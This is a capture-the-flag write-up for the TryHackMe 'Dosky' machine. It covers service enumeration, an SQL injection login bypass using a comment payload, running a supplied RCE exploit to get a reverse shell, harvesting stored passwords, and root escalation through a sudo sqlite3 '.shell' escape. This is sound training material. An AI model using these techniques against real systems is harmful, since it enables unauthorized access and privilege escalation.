<h1 align="center">Dosky Exploitation</h1> 
<h6 align="center"> Official Writeup for Try Hack Me</h6>

<p>Dosky is a challenge that will test your knowledge of informations security in differents areas such as:</p>
<ui>
	<li>Service Enumeration.</li>
	<li>WebApp Exploitation.</li>
	<li>Vulnerabilities exploitation using exploits.</li>
	<li>Linux Enumeration.</li>
	<li>Privilege Escaletion</li>
</ui>

___
<h3 align="center">Enumeration</h3>
<p>After deploying our virtual machine we have to enumerate services, we do not know what this server is actually running but we can try to figure out it.</p>

<p>First we will start scanning ports with <b>Rustscan</b>, this scanner is fast so we can scan all  ports in a few seconds.</p>

```
rustscan 10.10.159.174 --ulimit 5000 -- -p-

Open 10.10.159.174:22
Open 10.10.159.174:80
Open 10.10.159.174:5000
Open 10.10.159.174:10515

```
<p>There are some services runing, using <b>Nmap</b> now we can receive more information about the ports we know that are oppened</p>

```
PORT          STATE SERVICE VERSION
22/tcp         open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp         open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp       open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
10515/tcp      open  unknown

```
<ur>
	<li>Openssh is a normal service and we would need to find credentials to have access to it, let's take a look on it after.</li>
	<li>The port 80 is running apache2, as well it is a normal service and we can enumerate looking for information.</li>
	<li>Running on port 5000 we have an interesting service, maybe flask webapp, we will have to see this.</li>
	<li>But now we have a service that cannot be detected by nmap, we will have to see it manually.</li>
</ur>

### Apache2
<p>We have an apache server running, however it does not seem to be anything interesting as it is just a default service page showing.</p>
<p>Even viewing the code, nothing catches my attention, just a few modified texts and in different languages.</p>

### Dosky's Web Page
<p>Entering the service that runs on port 5000 we find a website about a software called Dosky.</p>
<p>A normal website about the service, and reading a little about it I found out what Dosky is: Dosky is a software that is based on server and client side in two separate programs, so you can manage the services that run on your server remotely and in a secure way..</p>
<p>Okay, now that we see this let’s try to exploit something.</p>

<p>First let’s enumerate the directories of the website. We will use gobuster.</p>

```
/admin (Status: 200)
/console (Status: 200)
/download (Status: 200)
/robots.txt (Status: 200)
```

<p>Gobuste was able to find some interesting directories, one of them refers to a console that runs on Flesk applications under development and it is in debug mode, but we would have to have the pin to have access, so we wont lost our time with it.</p>
<p>"/download" can be accessed through the main page, this makes us download a program that is Dosky_Client, can be useful.</p>
<p>The webpage shows us that there is an Bug Bounty program opened for the public to test their aplications. After entering the Bug Bounty page it seens to be under contruction, but it has a email for contact.</p>

`Email: hanny@dosky.com` It can be usefull later.

<h3 align="center">WebApp Exploitation</h3>

<p>Taking a little deeper look at <b>/admin</b> takes us to the administration page that is protected by a login and password form.</p>

<p>This form allows only email to be inserted, which makes it difficult to explore, however we can bypass using a reverse proxy like <b>Burp Suite</b>.</p>

<p>This way I was able to do some tests and finally find out that the application is vulnerable to <b>sql injection</b>, so even without knowing the password we can use the email that we had found on the Bug Bounty page to bypass the authentication.</p>

### SQL Injection Time
<p>With the Burp Suite connected and intercepting all the traffic we should try to log in to the form with the following credentials:</p>

```
Email: hanny@dosky.com
pasword: abc123
```

<p>And the post data would looks like this:</p>

```
email=hanny%40dosky.com&password=abc123
```

<p>So on the email we will inject the payload</p>

`'-- -` and the post request will look like this: `email=hanny%40dosky.com'-- -&password=abc123`
so we had a success.

### Exploiting Dosky
<p>On the dashboard we have an email from someone who participated in the program and found a failure in Dosky Server, we can read the report, which explains about remote code execution found in the software and we have access to the exploit.</p>

<p>We have to download the exploit then run it using python3.</p>

`Usage: exploit.py <Remote Host> <Port>`
<p>It's very simple and first we will just have to set the server's ip and port. The service is then that stranger running on port 10515.</p>

```
Dosky 1.0 RCE PoC
[OK] - Successful connection.
[OK] - Vulnerable!
[*] - Bash payload.
Local Host> <your ip>
Local Port> 4444
[*] - Generating payload.
[*] - Injecting payload:

Listening on 0.0.0.0 4444
0.0.0.0 Connection received on 40744
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
dosky@dosky:~$ 

```

<p>And we got a reverse shell!!!</p>

<h3 align="center">Linux Enumeration</h3>

<p>We have access to the machine, but we realize that there is a lot of content to be examined, so let's get straight to the point.<br><br> At the root of the system we have a file called <b>.important.txt</b>, this file has important information, dosky's password.</p>

```
dosky@dosky:/$ cat .important.txt

I changed the user Dosky password to: ************
it's easier and everyone will be allowed to handle that user.

```

<p>The shell we have is not so good so we can connect via ssh with the password we got now.</p>
<p>In the dosky user home folder we have the dosky service, which was exploited to give us access to the machine, inside this python file it has the access passwords for the server as well as the username. Looking better the file you can find the flag.</p>

```

                if user == "admin":
                    if passwd == "35e50bad096e65cebe00974daed9beec":
                        print("logged sussfully")
                        logs = """

```

<p>To obtain the first flag, we must connect to the server with Dosky_Client and login with the credentials.<br><br>The web application is found in a folder on the dosky home</p>

<p>It has a database of type sqlite3 that has Hanny's credentials to enter her dashboad, her user in the machine uses the same password.</p>

```
dosky@dosky:~/Web_Site_v2$ cat auth.db

###[#tableauthauthCREATE TABLE "auth" (
        "user"  TEXT NOT NULL,
        "passwd"        TEXT NOT NULL
+hanny@dosky.com********

dosky@dosky:~/Web_Site_v2$ su hanny
password:
hanny@dosky:/home/dosky/Web_Site_v2$ 
```

<p>After switching users we can access hanny's home and find the second flag.</p>

```
hanny@dosky:~$ ls
SSH-Honeypot  user.txt
hanny@dosky:~$
```

<h3 align="center">Privilege Escalation</h3>

<p>To elevate our privilege on the machine there are some things we can do such as using LinPeas or tools like this. </p>
<p>But by running the command <b>sudo -l</b> we realize that we have the possibility to run the <b>SQLIte3</b> as a super user.</p>
<p>Ok! so running the command we can elevate our privilege.</p>

```
sudo sqlite3 /dev/null '.shell /bin/sh'
```

<p>Now we can go to the root's home and get the flag.</p>

<h5 align="center">The End</h5>

